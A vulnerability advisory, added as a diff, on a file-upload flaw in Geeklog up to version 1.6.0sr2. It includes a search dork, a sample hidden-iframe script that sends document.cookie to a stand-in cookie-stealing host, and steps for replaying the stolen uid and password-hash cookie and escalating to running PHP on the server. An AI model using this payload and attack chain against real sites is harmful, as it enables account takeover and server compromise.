@@ -1,0 +1,57 @@
+==============================================================================
+ Geeklog <= v1.6.0sr2 -  Remote File Upload
+
+ Discovered: JaL0h
+
+ Software Site: http://www.geeklog.net
+
+ Dork: "By Geeklog" "Created this page in" +seconds +powered
+==============================================================================
+
+Remote File Upload
+==================
+Geeklog has several options to upload images.  The image upload process does
+not validate the mime type of the upload.  Geeklog trusts the mime type
+specified by the browser and also checks the file extension, both of which
+are very easy to spoof.
+
+Files with .jpg extensions can be uploaded, but these file can contain
+anything, like javascript or PHP code. Using FireFox you can upload any
+jpg extension and it will be accepted since FireFox sets the mime type
+based on file extension.
+
+Uploading usually requires that you first create a user account.  Once an
+account is created, you can upload a user photo, which could take advantage
+of this vulnerability.
+
+
+Potential Abuse
+===============
+Executable javascript can easily be uploaded.  There are several XSS holes in
+many of the Geeklog plugins which could run the uploaded javascript. If a simple
+cookie stealing javascript were uploaded, it could be used to expose the Geeklog
+uid and password hash which is as good as having the actual password.
+
+Sample JavaScript
+
+document.write('<iframe src="http://my.cookiestealingsite.com/cs.php?ck='
+    + document.cookie + '" id="myFrame"  frameborder="0"  vspace="0"
+    hspace="0"  marginwidth="0"  marginheight="0" width="0"  scrolling="no"
+    height="0"  style="visibility:hidden;"></iframe>');
+
+Once the uid and password hash is known, you can set a cookie in  your browser:
+
+geeklog=[uid]; password=[md5 hash];
+
+which gives you instant access to everything the user has access to. If you
+expose an administrative account, you have full access to the admin panel
+where you can set the staticpages.PHP permission to true, then create a
+static page that will run any PHP script you desire, potentially exposing
+the entire server.
+
+The cookie exploit was originally documented by Nine:Situations:Group::bookoo
+http://www.milw0rm.com/exploits/8376 and remains unfixed.
+
+Successful exploitation requires the ability to execute the uploaded JavaScript.
+The Geeklog Forum program can be used as an attack vector since it does not
+properly validate many $_GET / $_POST variables.
